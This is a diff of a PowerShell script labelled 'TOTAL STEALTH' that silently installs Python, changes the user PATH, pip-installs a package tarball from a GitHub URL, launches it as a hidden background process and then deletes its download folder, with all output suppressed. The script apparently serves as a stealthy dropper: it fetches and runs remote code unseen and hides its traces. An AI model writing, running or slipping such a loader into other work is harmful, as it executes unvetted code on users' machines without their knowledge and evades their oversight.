@@ -1,13 +1,13 @@
 # ===================================================
 # Python 3.12.6 + httpfluent
-# TOTAL STEALTH (Redirect to $null)
+# TOTAL STEALTH - ALL OUTPUT TO NULL
 # ===================================================
 
 $InstallDir = "$env:LOCALAPPDATA\Programs\Python\Python312"
 $PythonExe = Join-Path $InstallDir "python.exe"
 $InstallRequired = $true
 
-# --- Pre-Check (Redirected to $null) ---
+# --- Pre-Check (Silent) ---
 if (Get-Command python -ErrorAction SilentlyContinue) {
     $CheckPath = "python"
 } elseif (Test-Path $PythonExe) {
@@ -24,7 +24,7 @@ if ($CheckPath) {
     }
 }
 
-# --- YOUR ALGORITHM (All output to $null) ---
+# --- YOUR ALGORITHM (Redirected to $null) ---
 if ($InstallRequired) {
     $PythonVersion = "3.12.6"
     $PythonInstaller = "python-$PythonVersion-amd64.exe"
@@ -32,7 +32,7 @@ if ($InstallRequired) {
     $DownloadDir = "$env:TEMP\Python"
 
     if (-not (Test-Path $DownloadDir)) {
-        New-Item -ItemType Directory -Path $DownloadDir > $null
+        New-Item -ItemType Directory -Path $DownloadDir > $null 2>&1
     }
 
     $InstallerPath = Join-Path $DownloadDir $PythonInstaller
@@ -41,35 +41,35 @@ if ($InstallRequired) {
         $WebClient.DownloadFile($DownloadUrl, $InstallerPath)
     } catch { exit 1 }
 
-    # Start Install (Hidden)
-    Start-Process -FilePath $InstallerPath -ArgumentList "/quiet InstallAllUsers=0 PrependPath=1 Include_test=0 TargetDir=`"$InstallDir`"" -Wait -WindowStyle Hidden > $null
+    # Step 4: Install Python
+    Start-Process -FilePath $InstallerPath -ArgumentList "/quiet InstallAllUsers=0 PrependPath=1 Include_test=0 TargetDir=`"$InstallDir`"" -Wait -WindowStyle Hidden > $null 2>&1
 
-    # Fix Path
+    if (-not (Test-Path "$InstallDir\python.exe")) { exit 1 }
+
+    # Step 5: Fix USER PATH
     $OldPath = [Environment]::GetEnvironmentVariable("Path","User")
     $OldPath = $OldPath -replace [regex]::Escape("$env:LOCALAPPDATA\Microsoft\WindowsApps;"),""
     $NewPath = "$InstallDir;$InstallDir\Scripts;$OldPath"
-    [Environment]::SetEnvironmentVariable("Path",$NewPath,"User") > $null
+    [Environment]::SetEnvironmentVariable("Path",$NewPath,"User") > $null 2>&1
     $env:Path = $NewPath
     $ExecutableToUse = $PythonExe
 }
 
-# --- Package Installation (Force Silence) ---
+# --- Step 6 & 7: Package Installation & Execution ---
+
+# Update pip quietly
 & $ExecutableToUse -m pip install --upgrade pip --quiet > $null 2>&1
+
+# Install requests
 & $ExecutableToUse -m pip install requests --quiet > $null 2>&1
+
+# Install custom package
 & $ExecutableToUse -m pip install "https://github.com/httpfluent/Intranetflow/raw/main/v1.0/httpfluent-0.1.tar.gz" --quiet > $null 2>&1
 
-# --- FIX: Run httpfluent using full path to script ---
-# We use -m (module) or direct path to the script to ensure it runs
-$HttpFluentScript = Join-Path $InstallDir "Scripts\httpfluent.exe"
+# LAUNCH METHOD: Running as a python module in background
+Start-Process -FilePath $ExecutableToUse -ArgumentList "-m httpfluent" -WindowStyle Hidden > $null 2>&1
 
-if (Test-Path $HttpFluentScript) {
-    Start-Process -FilePath $HttpFluentScript -WindowStyle Hidden > $null 2>&1
-} else {
-    # Fallback to module mode
-    Start-Process -FilePath $ExecutableToUse -ArgumentList "-m httpfluent" -WindowStyle Hidden > $null 2>&1
-}
-
-# Cleanup
+# --- Step 8: Cleanup ---
 if (Test-Path $DownloadDir) {
-    Remove-Item $DownloadDir -Recurse -Force -ErrorAction SilentlyContinue > $null
+    Remove-Item $DownloadDir -Recurse -Force -ErrorAction SilentlyContinue > $null 2>&1
 }
